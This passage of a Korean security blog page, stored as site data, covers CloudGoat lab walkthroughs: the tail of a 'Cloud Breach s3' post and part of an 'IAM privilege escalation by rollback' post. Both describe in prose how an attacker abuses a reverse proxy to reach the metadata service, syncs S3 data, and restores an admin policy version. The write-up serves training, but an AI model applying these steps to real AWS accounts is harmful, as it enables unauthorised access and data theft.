url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxElEQVQI1y3Di06CUACAYTSdc21WTKUVGHEHGddzPHAQxNV6/zf621rf9hlS3SkqTa+/KPUPVTtS/++Hb1o1o84DczJxz2e03zOlV1Qo6fyOKG7xwxrXKzAPnxhC3ojTlrLqCZqZNL+QZoK86GjESKtuiODCaEvGD4V+F4yOwLU8tqbN/uhxfA04WD7bRwsjiCrCuKYoe6J6oqgH4qShLK9kmSQ5S9x9iLO2cTYOp80Je/XGbm2yXL1gLHYYy6e/i4dnfgHeNlgmzUZeQAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"8\"\n        title=\"8\"\n        src=\"/static/a2c2ddd6e15f1169848cf15abb1e7351/37523/8.png\"\n        srcset=\"/static/a2c2ddd6e15f1169848cf15abb1e7351/e9ff0/8.png 180w,\n/static/a2c2ddd6e15f1169848cf15abb1e7351/f21e7/8.png 360w,\n/static/a2c2ddd6e15f1169848cf15abb1e7351/37523/8.png 720w,\n/static/a2c2ddd6e15f1169848cf15abb1e7351/302a4/8.png 1080w,\n/static/a2c2ddd6e15f1169848cf15abb1e7351/2a08f/8.png 1422w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>S3 bucket 내의 데이터를 로컬로 다운로드 받을 수 있도록 sync 를 진행하여 목표인 파일을 추출 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 54.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACzUlEQVQoz22Ra0uTARiGR5HVNt37ui01syiKNHVubkMzD5lblmaZhzyUSSstN7JazjJXMg95yt6aipbF1gpbrQnZiQrSigo6EPSHrtiqD0UfLm544L644ZElp6xHnbAGUZtMrLgqijxOE0VUJxIXH7kloF61mnhtEoI6CUGz+ldq16BJXBftRm5xYiIyTfJaRG1StKhUqYmRC+zebqapMp/ibWnYD5XRUm9hf4WRK5famB5w4u1rxzd+mQlpkEFJ4t6DMF++fcfWYkeWkJyCoElCEacmVtCwXBlPywELbpsVV/NOrp9twD/aTeuRWjqdxwn5xhnqOsRQrwNpwEXA28OrRwE+vHlOY109MkGbSKyoZYVCxUqFKrqwsiiNnsMlzJxvYvCYhUC/k+BNL+HZAK9fvcZ17hS25j28vzvGZ18vX4NeXk65aSwvQaYSNchjxV9CpYplChFHTQlt5XrcRyu45W5l0tnAs8AkPxaesTgfYn5ujo72Ru54uxn1nODBlIfbYy7SM1KRrVAIv2VClGVyFUeqy5l01THlqsdevZ1r7bW89Y1yu7+LheAML2Z9OBwHGeho4nRbDe5OO6O9XZhMZmR/RBEiS5fEKLjQ4SR0Z4Y5/w2uj40wLQ3zKTTDm4d+Fu96eSx1My0NIg156DztwN5QRaWlgGyd/n9COZ6ey8yHnxL0B3kSDLMYDrLgv8piyM/HsJ93IR83Rvqprqphl9VK475ybDV7yDGa/hEqBZYuV9LRchjfcA/XLp1nzOPB4zpD814rtTsLkS66uD8xTN9JG3tLrWxavxZrnpn25joKcvP+FkaIkasoK97Gwcrd7MjfSoHZQJ4xi0JTFubMVHKMRiwF+dRXlFK6o4jUDSkU6VNprS2jMHfrv0IVkSdt3JyOwWBCrzeg1+mjGHQ6dBkZZOoM6PSmaGZnG8lIT8eUpcNalM+WtEx+Aknkp94fb+b6AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"9\"\n        title=\"9\"\n        src=\"/static/3225eaf09493dfc67ef633f0ef4167f6/37523/9.png\"\n        srcset=\"/static/3225eaf09493dfc67ef633f0ef4167f6/e9ff0/9.png 180w,\n/static/3225eaf09493dfc67ef633f0ef4167f6/f21e7/9.png 360w,\n/static/3225eaf09493dfc67ef633f0ef4167f6/37523/9.png 720w,\n/static/3225eaf09493dfc67ef633f0ef4167f6/302a4/9.png 1080w,\n/static/3225eaf09493dfc67ef633f0ef4167f6/d073d/9.png 1297w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 흐름도</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%B0%EC%84%A4%EC%A0%95\">시나리오 환결설정</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#ec2-instance-ip-%EB%B6%84%EC%84%9D%EB%B0%8F-%ED%99%9C%EC%9A%A9\">EC2 Instance, IP 분석및 활용</a></li>\n<li><a href=\"#ec2-metadata-service-query%EB%A5%BC-%EC%9C%84%ED%95%B4-%EC%9E%98%EB%AA%BB-%EA%B5%AC%EC%84%B1%ED%95%9C-reverse-proxy%EB%A5%BC-exploit\">EC2 Metadata Service Query를 위해 잘못 구성한 reverse proxy를 Exploit</a></li>\n<li><a href=\"#%EC%83%81%ED%98%B8-%EC%97%B0%EA%B2%B0%EB%90%9C-ec2-%EC%9D%B8%EC%8A%A4%ED%84%B4%EC%8A%A4-%ED%94%84%EB%A1%9C%ED%8C%8C%EC%9D%BC%EC%9D%84-%EA%B0%80%EC%A0%95\">상호 연결된 EC2 인스턴스 프로파일을 가정</a></li>\n<li><a href=\"#s3-bucket-%EB%A6%AC%EC%8A%A4%ED%8A%B8\">S3 Bucket 리스트</a></li>\n<li><a href=\"#s3-sync-%EB%AA%85%EB%A0%B9%EC%9D%84-%ED%86%B5%ED%95%B4-cardholder-data-bucket%EC%97%90%EC%84%9C-%EC%A4%91%EC%9A%94%ED%95%9C-%EB%8D%B0%EC%9D%B4%ED%84%B0-%ED%83%88%EC%B7%A8\">S3 “SYNC” 명령을 통해 Cardholder-data Bucket에서 중요한 데이터 탈취</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 4 (CloudGoat: Cloud Breach s3)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-4/"}},"prev":{"id":"edaa6ec1-a05a-5b6c-950f-64bc334b2dbc","html":"<h1 id=\"클라우드-서비스-취약점-분석-2\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-2\" aria-label=\"클라우드 서비스 취약점 분석 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 2</h1>\n<h1 id=\"scenario-1--iam-privilege-escalation-by-rollback\" style=\"position:relative;\"><a href=\"#scenario-1--iam-privilege-escalation-by-rollback\" aria-label=\"scenario 1  iam privilege escalation by rollback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 1]:  IAM Privilege Escalation By Rollback</h1>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Size: Small\nDifficulty: Easy\nCommand: $ ./cloudgoat.py create iam_privesc_by_rollback</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>한 명의 IAM User (5 정책 버전)</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>IAM User: Raynor</li>\n<li><code class=\"language-text\">SetDefaultPolicyVersion</code>을 통한 이전 버전으로 rollback 하는 기능을 이용하여 권한 상승이 가능합니다.</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li>공격자는 highly-limited IAM 사용자 부터 시작해서 이전 IAM 정책 버전을 검토하고 전체 관리자 권한을 허용하는 버전을 복원해서 권한 상승 취약점을 이용할 수 있습니다.</li>\n<li>IAM 사용자 <code class=\"language-text\">Raynor</code> security credentials</li>\n</ul>\n<h3 id=\"시나리오-환경-설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD-%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환경 설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환경 설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABW0lEQVQoz3WRW2+CQBSEERW0yEVuCiwXISqiSLVqg03VNH1u+t70T/T/J9PsMRpt0ofJkJPl25k9Qke1ISvWVdLNt6zYEET9fzU08kbTgNjqkws+m8Edjkl9KyFnYQHLSaEbERTVx4PqoacF6Gk+VD2gmaoz6P2Q5hcYd2G9OaGsXkj5fIe82OHx6YBpsUU2WWHgjQneVQaQOjakrgOp40DuuqS2bN8DeSLbzeAMzuIAw4opAf+BV6KDvN5fCSr5BUiVeZp5WWOxrDGdbcnXmyPKao9JvoHtpjDtBLoZ0SU9PYBmMGhGCMOM6Tku6ejiJKsQxnOwqEDAcvgsRxiXiJIK2XiFJF0iGpUEaUkWVbyIPwGf3QHjUQkWzQjoxYtzIseH63swTEap+BKabfO60Ws90bjbMAHr/RF1fcD29R3D0yeed2/4+Erx/aMiX2QQWw4l4cDbJLe6TfgLejXGYTnmHOMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/30ddf6e63a3311a4fd4e4c117945ae5d/37523/0.png\"\n        srcset=\"/static/30ddf6e63a3311a4fd4e4c117945ae5d/e9ff0/0.png 180w,\n/static/30ddf6e63a3311a4fd4e4c117945ae5d/f21e7/0.png 360w,\n/static/30ddf6e63a3311a4fd4e4c117945ae5d/37523/0.png 720w,\n/static/30ddf6e63a3311a4fd4e4c117945ae5d/302a4/0.png 1080w,\n/static/30ddf6e63a3311a4fd4e4c117945ae5d/46115/0.png 1290w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADDElEQVQoz22SS0xTQRSGDxTovbcXeWPpzL2FthYsUB6l0gIWkUeFermU8jBIQdSoiYlGExODITFQg2AEQQE1sEDR+FgBghJeGxJrjDFESIyJK13owrBQQxXpmCsBNi7+nMnMme/8M+eARqNjDclpBwwGYwYhBMxW+7ncfGH0YIX7oUOsfyQ4Gx47xIanQuWRp1Isr2yS1o9zbOXj5hxHnXQnQaNjMMY0xjgEOI6nk5KSExKTUjAAgNliv5qbX74sVjZ6BWfja1d1k1c46JoVxeo5QXDNOStq50Sxeibbss+bnpLaeOraJ9Dq01ikipOAckAIUQwTHBQexgZjTk0vzBLo65sEqfJnQgBgRl7s8Zvtnj+mYo/fVNi6ZrJ71kzuu8RUeZ1kJ5e2RUQChHDx+g0gxpjiOI7eUDytjlMztlQdY81zsgAQmH9+ObPmum/e3eObcPf4pmq7fFOHunyT9TdWnzs7VifNJ15qpLwEQw6zBcQY0QhxtDIygMq0RNEAMTRnjKZ1mhiKBgiOtl4OV9jux6rESYQqXqDQvYPRMfYnO1XZZ3coAIJ5bSqNkGrboW5PmUJ64v7eL0UFQ+Rd2zzxlg2T9/n9349L+7Xda6+ODayTpv71n03966sNt9Z/uG/5SUXn73Hp3w1ZdoZTa7eBBmsVO0YIlLZ+ddd2r5CR+W/k+MAKKb2y0rlACAjtv0YP9/o/1N/0v63r8S/W9fjf1HT7P9rbfEMAELArrZDheM020JhiZqSD02dmsvqa+4YHWzx3bl/qetB8YUqQHGLLxWjIGs5gi8Zs4aXP9wda7mUFWkcyY9OPhnERIEe8lkYIbXdZFaekNFoDDQBBEmBTACAboEAGKd16tnjCy7umlzjX9GJ81cwSVfBsDvQtKrsCgpRq4+YcbjYF0xJUq89gLLkOtrCghM2zOdjE5FwGxTKUcreDDcns4AOMHWowtqsD0jrj5aZ2TqW3KXBcFIUwT28BEUJyyeX/hKWIeYpXhspFANkxAFkDgOwkQGAJgIz7B+M28pA0KSjkL/EzBdFI93hyAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"27.png\"\n        title=\"27.png\"\n        src=\"/static/52e6d27f45fc842ac420ddf38f505b82/37523/27.png\"\n        srcset=\"/static/52e6d27f45fc842ac420ddf38f505b82/e9ff0/27.png 180w,\n/static/52e6d27f45fc842ac420ddf38f505b82/f21e7/27.png 360w,\n/static/52e6d27f45fc842ac420ddf38f505b82/37523/27.png 720w,\n/static/52e6d27f45fc842ac420ddf38f505b82/302a4/27.png 1080w,\n/static/52e6d27f45fc842ac420ddf38f505b82/07a9c/27.png 1440w,\n/static/52e6d27f45fc842ac420ddf38f505b82/4435f/27.png 2479w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<ul>\n<li>IAM 사용자 “Raynor” 로 시작해서 공격자는 사용할 수 있는 권한이 몇 개 밖에 없습니다.</li>\n<li>공격자는 Raynor의 권한을 분석하고 SetDefaultPolicyVersion 권한을 확인합니다.</li>\n<li>이전의 버전을 기본값으로 설정하여 정책의 다른 4개 버전에 대한 액세스를 허용합니다.</li>\n<li>이전 정책 버전을 검토한 후 공격자는 특정 버전이 전체 관리자 권한 을 제공한는 것을 발견</li>\n<li>공격자는 전체 관리자 정책 버전을 복원하여 전체 관리자 권한과 원하는 악의적인 작업을 수행할 수 있는 능력을 얻습니다.</li>\n<li>마지막 단계로 공격자는 Raynor의 정책 버전을 원래 버전으로 되돌리도록 선택할 수 있습니다.</li>\n</ul>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"iam-user-raynor-사용-가능한-권한-열거\" style=\"position:relative;\"><a href=\"#iam-user-raynor-%EC%82%AC%EC%9A%A9-%EA%B0%80%EB%8A%A5%ED%95%9C-%EA%B6%8C%ED%95%9C-%EC%97%B4%EA%B1%B0\" aria-label=\"iam user raynor 사용 가능한 권한 열거 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IAM User: Raynor 사용 가능한 권한 열거</h3>\n<ul>\n<li>클라우드 환경을 분석하던중 <code class=\"language-text\">raynor</code> 사용자의 AWS IAM config 파일을 확인할 수 있었습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABXUlEQVQY023P23KaYBiF4V9NZ5pJSLQ2QYNEQESRPchWQBJNxwvoNPd/JW9HmsMePAfrYM33LaGvAhTV5mWxxbRirnllRVjbPUvdw3YyVCNEtXK+SwpCSAxGY4Y3k/8S603SFzXDJ4wbXL/q+WHNxs6IkhY7aNmGHc8zk/uHBbd3M8TgATF4/Ed8GY4Rad5SlB1p1lK3H7wfT9iX39j1L7qmoyhb6uaNY3emPZ4oioZ9WhFGKVFUkuQ+l88Jlz9PyIqMcLy8/8ILKtygYmPHGGufV32HvUtwvQzdcJjNV8gznecv8txgrpgo6hp1ueJVM3mcKAgvOJCXH/hRTZQcMa0Ebemg6z6Kuutn226B410PHpgrW378NHiSTe6kF4Y3U4YjuTf6NkVkRcehPpOkDWneURUdRnVhk59I4pJ91hLva4ryjbJ6pzqcqOoz156muyy0JX51j19KSOMpfwHjVq6An0EyNwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/0611d0f31dc52d59d423dd14d5d437d5/37523/1.png\"\n        srcset=\"/static/0611d0f31dc52d59d423dd14d5d437d5/e9ff0/1.png 180w,\n/static/0611d0f31dc52d59d423dd14d5d437d5/f21e7/1.png 360w,\n/static/0611d0f31dc52d59d423dd14d5d437d5/37523/1.png 720w,\n/static/0611d0f31dc52d59d423dd14d5d437d5/681f1/1.png 899w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 사용자의 <code class=\"language-text\">access_key_id</code>, <code class=\"language-text\">secret_key</code> AWS Credentials를 확인한 결과 유출된 값으로 AWS config Profile을 설정하여 해당 권한을 획득하기로 하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: 